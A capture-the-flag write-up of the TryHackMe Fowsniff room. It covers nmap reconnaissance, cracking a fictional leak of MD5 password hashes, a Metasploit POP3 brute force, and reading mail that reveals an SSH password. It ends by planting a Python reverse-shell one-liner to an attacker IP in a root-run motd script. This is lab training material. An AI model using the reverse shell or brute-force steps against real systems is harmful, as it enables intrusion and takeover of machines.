---
title: TryHackMe Fowsniff CTF
date: 2024-05-08 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg
---

Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

## **Skills Needed**
POP3, Web enumeration, nmap, Privilege escalation, Metasploit, Bruteforce, OSINT

## **Reconnaissance**
---
Initially do the Nmap scan.

```bash
nmap -sC -sV -p- $IP --open
```
`--open`: Scans only the open ports and reduces the time it takes to complete the nmap scan.


```bash
Nmap scan report for 10.10.171.156
Host is up (0.30s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING UIDL SASL(PLAIN) AUTH-RESP-CODE RESP-CODES USER CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ID OK more have AUTH=PLAINA0001 IDLE post-login LITERAL+ listed LOGIN-REFERRALS IMAP4rev1 ENABLE SASL-IR capabilities Pre-login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.53 seconds
```

## **Insights and To-TRY List**
---
OS: Ubuntu

80 → HTTP
- Their homepage showing that the company has been compromised and that they have exposed the usernames and passwords
- Gave me a hint to their compromised twitter account
- Found leaked credentials


110 → pop3

- 

143 → imap

22→ SSH

## **Enumeration**
---
### 80 -> HTTP

**Viewing the webpage.**

![Desktop View](/assets/images/fowsniff-ctf/homepage.png){: width="972" height="589" }

Looking at the homepage, it looks like an attacker was able to compromise their twitter account. It is also important to highlight that their employees have been instructed to change their password immediately.

Let us look through their twitter page.

![Desktop View](/assets/images/fowsniff-ctf/twitter.png){: width="972" height="589" }

Inspecting the URL

![Desktop View](/assets/images/fowsniff-ctf/backups.png){: width="972" height="589" }

Backups are interesting, let’s visit that.

```bash
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |         
|       .oooO                |         
|        (   )   Oooo.       |         
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!
 
 
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
 
Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!
 
Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!
 
MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P
 
l8r n00bz!
 
B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

--- THIS IS NOT A REAL PASSWORD LEAK ---
 
All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.
 
Any similarities to actual people or entities is purely coincidental and occurred accidentally.

-------------------------------------------------------------------------------------------------
```

Few takeaway based on the information we’ve got

- these password are hashed using MD5
- pop3 is exploitable

Get only the password and crack them using [hashes.com](https://hashes.com/en/decrypt/hash).

![Desktop View](/assets/images/fowsniff-ctf/hashes.png){: width="972" height="589" }

```bash
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```


### 110 -> POP3


In metasploit there is a packages called: `auxiliary/scanner/pop3/pop3_login` where you can enter all the usernames and passwords you found to brute force this machines pop3 service.

```bash
msfconsole -q
```
`-q`: is a flag that stands for "quiet mode." When used, it prevents the banner (usually a random ASCII art and information about the software) from being displayed at startup. This can be useful for streamlining the interface or scripting purposes, as it reduces the clutter and outputs only the essential information.

You can search the available modules in metasploit using this command

```bash
search name:pop3
```

![Desktop View](/assets/images/fowsniff-ctf/searchpop3.png){: width="972" height="589" }

We will be using pop3_login module to brute force the port 110

```bash
use 3
```

```bash
show options
```

![Desktop View](/assets/images/fowsniff-ctf/options.png){: width="972" height="589" }

We have to set all the required parameters

Setting the RHOSTS

```bash
set <TARGET_IP>
```

```bash
set PASS_FILE /home/kali/Downloads/password.txt/kali/Downloads/password.txt
```

![Desktop View](/assets/images/fowsniff-ctf/passfile.png){: width="972" height="589" }

```bash
set USER_FILE /home/kali/Downloads/username.txt
```

![Desktop View](/assets/images/fowsniff-ctf/username.png){: width="972" height="589" }

After all the required parameters have been set. Run the module and get some coffee!

![Desktop View](/assets/images/fowsniff-ctf/run.png){: width="972" height="589" }

## **Gaining an Initial Foothold**

Looks like `seina` did not changed her password despite being instructed to change password after being breached. Login via pop3 using telnet or netcat

```bash
telnet <IP> 110
nc <IP> 110
```

pop3 commands
```bash
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities

```
Reference: [https://secybr.com/posts/pop3-pentesting-best-practices/](https://secybr.com/posts/pop3-pentesting-best-practices/)

Viewing mailbox

```bash
RETR 1
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

```

```bash
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

Looking at the email, it seem like we have a credentials to login via SSH

```bash
ssh baksteen@<IP>
```
![Desktop View](/assets/images/fowsniff-ctf/ssh.png){: width="972" height="589" }


## **Privilege Escalation**
---
Now that we are in, we need to know which group `baksteen` belongs to.

```bash
groups <username>
```
Afterwhich, we need to find which files or directory the user group have write access

```bash
find / -group users -perm /g+w 2>/dev/null
```
![Desktop View](/assets/images/fowsniff-ctf/writeaccess.png){: width="972" height="589" }

That means we can be able to edit this shell script and spawn a root shell. However, we also need to remember that the directory `/etc/update-motd.d` is owned by root and that one of files contains the `cube.sh` script that will execute when we login via SSH.

![Desktop View](/assets/images/fowsniff-ctf/cube.png){: width="972" height="589" }

Editing the shell script for a reverse shell

![Desktop View](/assets/images/fowsniff-ctf/rev.png){: width="972" height="589" }

Put this simple reverse shell script from revshells.

```bash
export RHOST="10.13.50.82";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
Reference: [https://www.revshells.com/](https://www.revshells.com/)

Setup a netcat listener to catch the reverse shell when we login via SSH to the target machine

```bash
nc -lnvp <1234>
```

Relogin via SSH to execute the script as root.

![Desktop View](/assets/images/fowsniff-ctf/root.png){: width="972" height="589" }

And now we're ROOT!

> Do not forget to find the root flag
{: .prompt-danger }